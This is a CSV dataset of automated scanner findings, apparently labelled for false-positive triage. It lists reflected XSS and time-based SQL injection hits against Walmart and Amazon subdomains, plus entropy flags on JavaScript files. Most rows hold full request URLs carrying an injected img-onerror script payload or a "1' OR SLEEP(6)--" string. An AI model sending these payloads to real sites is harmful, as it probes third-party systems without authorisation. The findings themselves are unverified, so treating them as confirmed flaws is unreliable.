url_length,vulnerability,severity,cluster_density,is_false_positive
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Flightning%3AiconSvgTemplatesUtility&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_plk=rCmQPBndz-4dWLxB5-E2tw&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_dca=%7B%22_pl%22%3A%7B%22_cn%22%3A%22sitelayout%3A%2F%2Fsiteforce-generatedpage-d6c09e48-3a6c-4c7a-8271-2d64d25914ce.c105%22%2C%22_vc%22%3A%7B%22viewId%22%3A%222bbe3108-5f3b-4d2b-aa98-a10f5e2f6622%22%2C%22routeType%22%3A%22home%22%2C%22themeLayoutType%22%3A%22Inner%22%2C%22params%22%3A%7B%22language%22%3A%22%22%2C%22viewid%22%3A%22d6c09e48-3a6c-4c7a-8271-2d64d25914ce%22%2C%22view_uddid%22%3A%22%22%2C%22entity_name%22%3A%22%22%2C%22audience_name%22%3A%22%22%2C%22picasso_id%22%3A%22%22%2C%22routeId%22%3A%22%22%7D%2C%22hasAttrVaringCmps%22%3Afalse%2C%22pageLoadType%22%3A%22STANDARD_PAGE_CONTENT%22%2C%22includeLayout%22%3Atrue%7D%2C%22_bsi%22%3A%2293295a8a-b647-4f3d-afe3-4e3e62464e1a%22%2C%22_pcn%22%3A105%2C%22_ff%22%3A%22DESKTOP%22%7D%7D"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Flightning%3AiconSvgTemplatesUtility&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=626_nCkKlQNTsxn2nqHT88z04w"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sellerhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_plk=ebRDBPEeyig8LXhlm5WthQ&_style=1507593017&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_dca=%7B%22_pl%22%3A%7B%22_cn%22%3A%22sitelayout%3A%2F%2Fsiteforce-generatedpage-05a6abcb-53c3-4cd5-826f-7119bc22b489.c253%22%2C%22_vc%22%3A%7B%22viewId%22%3A%22eba9986d-9186-4f34-af88-466d89debedf%22%2C%22routeType%22%3A%22home%22%2C%22themeLayoutType%22%3A%22Inner%22%2C%22params%22%3A%7B%22language%22%3A%22%22%2C%22viewid%22%3A%2205a6abcb-53c3-4cd5-826f-7119bc22b489%22%2C%22view_uddid%22%3A%22%22%2C%22entity_name%22%3A%22%22%2C%22audience_name%22%3A%22%22%2C%22picasso_id%22%3A%22%22%2C%22routeId%22%3A%22%22%7D%2C%22hasAttrVaringCmps%22%3Afalse%2C%22pageLoadType%22%3A%22STANDARD_PAGE_CONTENT%22%2C%22includeLayout%22%3Atrue%7D%2C%22_bsi%22%3A%22731852d7-6daa-470c-a0b3-e29400bdb981%22%2C%22_pcn%22%3A253%2C%22_ff%22%3A%22DESKTOP%22%7D%7D"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://supplierhelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_plk=7VkFPMU3vqrZOZWbLg2tDg&_style=1353199215&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_dca=%7B%22_pl%22%3A%7B%22_cn%22%3A%22sitelayout%3A%2F%2Fsiteforce-generatedpage-81648d7c-a186-43be-81e7-525217a357b3.c54%22%2C%22_vc%22%3A%7B%22viewId%22%3A%22a4b14fa3-8bde-41a6-a37c-e76d0aacf820%22%2C%22routeType%22%3A%22home%22%2C%22themeLayoutType%22%3A%22Inner%22%2C%22params%22%3A%7B%22viewid%22%3A%2281648d7c-a186-43be-81e7-525217a357b3%22%2C%22view_uddid%22%3A%22%22%2C%22entity_name%22%3A%22%22%2C%22audience_name%22%3A%22%22%2C%22picasso_id%22%3A%22%22%2C%22routeId%22%3A%22%22%7D%2C%22hasAttrVaringCmps%22%3Afalse%2C%22pageLoadType%22%3A%22STANDARD_PAGE_CONTENT%22%2C%22includeLayout%22%3Atrue%7D%2C%22_bsi%22%3A%22adacc97c-866c-4bad-915e-ccee24c3622c%22%2C%22_pcn%22%3A54%2C%22_ff%22%3A%22DESKTOP%22%7D%7D"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://advertisinghelp.walmart.com/s/sfsites/auraCmpDef?_au=1537_wmTAUxhOaM_47EClrN56Dw&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=551347034&_style=-1530529874&aura.app=markup%3A%2F%2Fsiteforce%3AcommunityApp&aura.mode=PROD&_def=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&aura.lcdn=0&_uid=680_Z6a22lDft7RcZZ22-ipKlw"", ""name"": ""GET XSS"", ""type"": ""VULN""}",834d153f-6c61-43b4-be74-511dae936653,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sandbox.gscope.walmart.com/mfestatic/v1/integration_external/_common-libraries/lodash/4.17.21/lodash.min.js"", ""name"": ""High Entropy Anomaly (H=4.54)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://gscope.walmart.com/9741-3d8ccbf86e1aabd33837-aura.js"", ""name"": ""High Entropy Anomaly (H=4.72)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://photo.walmart.com/vite/assets/validations-BYOK3YPq.js"", ""name"": ""High Entropy Anomaly (H=4.64)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://walmart.com/px/PXu6b0qd2S/init.js"", ""name"": ""High Entropy Anomaly (H=4.5)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sandbox.gscope.walmart.com/5391-7442f0188f1edb4798d3-aura.js"", ""name"": ""High Entropy Anomaly (H=4.72)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://photo.walmart.com/javascripts/libs/mobile-detect-1.4.2.min.js"", ""name"": ""High Entropy Anomaly (H=4.61)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://cert-customcards.walmart.com/main.bundle.js"", ""name"": ""High Entropy Anomaly (H=4.7)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sandbox.gscope.walmart.com/npm.lodash-d99abe4201d053eb6378-aura.js?6970427a007508128dcf"", ""name"": ""High Entropy Anomaly (H=4.54)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://beta.walmart.com/px/PXu6b0qd2S/captcha/captcha.js?a=c&m=0&u=5e6008a0-38a4-11f1-a459-338ecf699fa8&v=5e753137-38a4-11f1-8456-9d2c84bf60dc&g=b"", ""name"": ""High Entropy Anomaly (H=4.56)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sandbox.gscope.walmart.com/7240-cd8949a4383756b22d94-aura.js"", ""name"": ""High Entropy Anomaly (H=4.8)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://www.game-uat.walmart.com/px/PXdtm21B5M/init.js"", ""name"": ""High Entropy Anomaly (H=5.5)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sandbox.delivery.walmart.com/mfestatic/v1/integration_external/@gscope-mfe/common-libs/0.1.27/main.js"", ""name"": ""High Entropy Anomaly (H=4.61)"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://photo.walmart.com/category/2164-custom-desk-mats?type=1%27+OR+SLEEP%286%29--&cb=985c1c"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",4c92ba3d-ccf5-4ee3-bb21-ef7e4f488a59,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://delivery.walmart.com/8595-d44c3bc7fd96299e2b76-aura.js"", ""name"": ""High Entropy Anomaly (H=4.61)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://gscope.walmart.com/3643-4a293fae3ebb7af9b0e1-aura.js"", ""name"": ""High Entropy Anomaly (H=5.95)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://cpa-qa.walmart.com/dc/privacy/_next/static/chunks/0ro.rke2cb~x7.js"", ""name"": ""High Entropy Anomaly (H=4.51)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://sandbox.delivery.walmart.com/9867-f8393e10d7641566c5e8-aura.js?6970427a007508128dcf"", ""name"": ""High Entropy Anomaly (H=6.02)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://delivery.walmart.com/9741-3d8ccbf86e1aabd33837-aura.js"", ""name"": ""High Entropy Anomaly (H=4.61)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://cert-customcards.walmart.com/px/PX28ievSK3/init.js"", ""name"": ""High Entropy Anomaly (H=4.79)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://carrier.walmart.com/3643-4a293fae3ebb7af9b0e1-aura.js"", ""name"": ""High Entropy Anomaly (H=5.95)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://business.walmart.com/px/PXu6b0qd2S/captcha/captcha.js?a=c&m=0&g=b"", ""name"": ""High Entropy Anomaly (H=5.07)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://eclosing-stage.walmart.com/static/js/2.9013d09c.chunk.js"", ""name"": ""High Entropy Anomaly (H=6.0)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://delivery.walmart.com/single-spa.config-e4dc91a7471167e50e71-aura.js?d02c828234b2d05e9a25"", ""name"": ""High Entropy Anomaly (H=4.65)"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://photos1.walmart.com/product-info/4232-beach-sheet-78x70?theme=wmfullphoto-2.themepack%3Abeach_sheet_78x70.blanket&amp%3Bdesign_code=1%27+OR+SLEEP%286%29--&amp%3Bvariant_name=variant_1&amp%3Btype=beach+sheet&cb=c0d565"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://affil.walmart.com/account/api/ccpa-intake?native=false&amp%3Btype=1%27+OR+SLEEP%286%29--&cb=aa90d6"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",9950742c-8eda-43f8-b269-7580910fd956,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://static-assets.business.amazon.com/libs/youtube/youtubeAPI.js"", ""name"": ""High Entropy Anomaly (H=5.95)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://m.media-amazon.com/images/S/sash/NYboFB6kBo7q11u.js?DVWebClient_runtime.11241fe0.js"", ""name"": ""High Entropy Anomaly (H=4.89)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://m.media-amazon.com/images/I/A1wp0GkduRL.js?AUIClients/KDPSeriesUI"", ""name"": ""High Entropy Anomaly (H=4.67)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://us-east-2.signin.aws.amazon.com/v2/assets/_next/static/chunks/9491-e9a1b243d7c45ed2.js"", ""name"": ""High Entropy Anomaly (H=4.54)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://aps.amazon.com/aps/static-includes/js/mixpanel/mixpanel-2-latest.min.js"", ""name"": ""High Entropy Anomaly (H=6.02)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://us-east-2.signin.aws.amazon.com/v2/assets/_next/static/chunks/6860-1ad65c7bd4a75c06.js"", ""name"": ""High Entropy Anomaly (H=4.57)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,1
32,"{""info"": {""severity"": ""HIGH""}, ""matched-at"": ""https://appstream2.us-east-1.aws.amazon.com/js/appstream/prod_vb415fc93102914c3b22a1fde4fffa4d79cbc0bcb.gz.js"", ""name"": ""High Entropy Anomaly (H=4.51)"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,1
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://buybox.amazon.com/MNN-Portable-15-6inch-Ultra-Slim-Speakers/dp/B0B9NNWXVP?_encoding=UTF8&amp%3Bpd_rd_w=nXrJW&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=1%27+OR+SLEEP%286%29--&amp%3Bpd_rd_wg=8OPEj&amp%3Bpd_rd_r=dbe8fe93-ccc8-4a73-a800-6bad2942f30b&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_541966&cb=db96c5"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://shopbylook.amazon.com/DaVinci-Gourmet-Classic-Vanilla-Bottle/dp/B00W6T2RZE?_encoding=UTF8&amp%3Bpd_rd_w=P7eH9&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=QK5ASZB09364R3T12YHV&amp%3Bpd_rd_wg=cCZ5w&amp%3Bpd_rd_r=1%27+OR+SLEEP%286%29--&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_16310101&cb=ddcaac"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://www.amazon.com/alm/storefront?almBrandId=QW1hem9uIEZyZXNo&ref_=US_TRF_ALL_UFG_RTL_OTHER_0462992&pf_rd_p=c6a7c180-96eb-4f61-8473-e711c847d64e&pf_rd_r=1%27+OR+SLEEP%286%29--&cb=f6589f"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://buybox.amazon.com/MRS-MEYERS-CLEAN-DAY-Biodegradable/dp/B07MFMWFYL?_encoding=UTF8&amp%3Bpd_rd_w=1%27+OR+SLEEP%286%29--&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=XXBYSMREA81QHE5NRT7Z&amp%3Bpd_rd_wg=8OPEj&amp%3Bpd_rd_r=dbe8fe93-ccc8-4a73-a800-6bad2942f30b&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_3760911&cb=b16564"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://buybox.amazon.com/MRS-MEYERS-CLEAN-DAY-Biodegradable/dp/B07MFMWFYL?_encoding=UTF8&amp%3Bpd_rd_w=II5jH&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=XXBYSMREA81QHE5NRT7Z&amp%3Bpd_rd_wg=1%27+OR+SLEEP%286%29--&amp%3Bpd_rd_r=dbe8fe93-ccc8-4a73-a800-6bad2942f30b&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_3760911&cb=7e9a93"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://shopbylook.amazon.com/AUTOMET-Sleeveless-Clothes-Outfits-Fashion/dp/B0CXPYLH28?_encoding=UTF8&amp%3Bpd_rd_w=3Vj88&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=QK5ASZB09364R3T12YHV&amp%3Bpd_rd_wg=cCZ5w&amp%3Bpd_rd_r=5f8a0856-5ac1-41b3-b9f8-e6c774769d14&amp%3Bref_=1%27+OR+SLEEP%286%29--&cb=eb4bf4"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
32,"{""info"": {""severity"": ""CRITICAL""}, ""matched-at"": ""https://iphone.amazon.com/Queen-Size-Piece-Sheet-Set/dp/B01M16WBW1?_encoding=UTF8&amp%3Bpd_rd_w=PA2ZW&amp%3Bcontent-id=amzn1.sym.f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_p=f2128ffe-3407-4a64-95b5-696504f68ca1&amp%3Bpf_rd_r=F5GCXMG3TT2WQ767F4Y2&amp%3Bpd_rd_wg=1%27+OR+SLEEP%286%29--&amp%3Bpd_rd_r=123cf83f-84dd-4f66-ae26-98f52d8e044e&amp%3Bref_=pd_hp_d_btf_crs_zg_bs_1055398&cb=32596c"", ""name"": ""Chronos Time-Blind SQLi"", ""type"": ""VULN""}",2cc6f7f7-46ce-41ed-9665-1522a9cd5242,1,0
